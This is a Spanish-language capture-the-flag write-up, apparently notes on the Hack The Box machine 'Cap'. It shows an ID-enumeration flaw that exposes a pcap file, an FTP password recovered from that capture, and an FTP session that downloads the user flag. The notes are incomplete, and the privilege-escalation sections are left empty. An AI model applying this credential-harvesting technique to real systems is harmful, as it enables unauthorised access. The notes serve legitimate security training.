## Payload / CVE used
- Get ftp pass trough pcap
- 

---

# Puerto 80 

Podemos sortear el id en http://cap.htb/data/[id]
Si vamos al id 0 podemos descargar el 0.pcap que contiene informacion interesante sobre las conexiones ftp
![[Pasted image 20241203172305.png]]

# 0.pcap
![[Pasted image 20241203172514.png]]
Tenemos la contrasena del ftp '`Buck3tH4TF0RM3!`'

## FTP
Probamos la conexion al servidor ftp con el usuario  Nathan que sale en la web y la password del 0.pcap:
```bash
âžœ  recon ftp cap.htb
Connected to cap.htb.
220 (vsFTPd 3.0.3)
Name (cap.htb:kali): nathan
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

Descargamos todo lo del ftp 
```bash
ftp> ls
229 Entering Extended Passive Mode (|||35291|)
150 Here comes the directory listing.
-rwxrwxrwx    1 1001     1001          235 Dec 03 15:59 a.py
-rwxrwxr-x    1 1001     1001       827841 Dec 03 11:57 linpeas.sh
-rwxrwxr-x    1 1001     1001         9627 Dec 03 13:53 poc.sh
drwxr-xr-x    3 1001     1001         4096 Dec 03 11:54 snap
-r--------    1 1001     1001           33 Dec 03 11:46 user.txt
226 Directory send OK.
ftp> get a.py
local: a.py remote: a.py
229 Entering Extended Passive Mode (|||23243|)
150 Opening BINARY mode data connection for a.py (235 bytes).
100% |************************************************************************|   235        6.79 MiB/s    00:00 ETA
226 Transfer complete.
235 bytes received in 00:00 (6.25 KiB/s)
ftp> get pco.sh
local: pco.sh remote: pco.sh
229 Entering Extended Passive Mode (|||21224|)
550 Failed to open file.
ftp> get snap
local: snap remote: snap
229 Entering Extended Passive Mode (|||46144|)
550 Failed to open file.
ftp> get user.txt
local: user.txt remote: user.txt
229 Entering Extended Passive Mode (|||6845|)
150 Opening BINARY mode data connection for user.txt (33 bytes).
100% |************************************************************************|    33       70.67 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (0.83 KiB/s)
ftp> 
```

ya tenemos la User flag, tambien funciona con ssh 
## Lateral Movement

### Local enumeration

- 

### Atack vector

- 

---

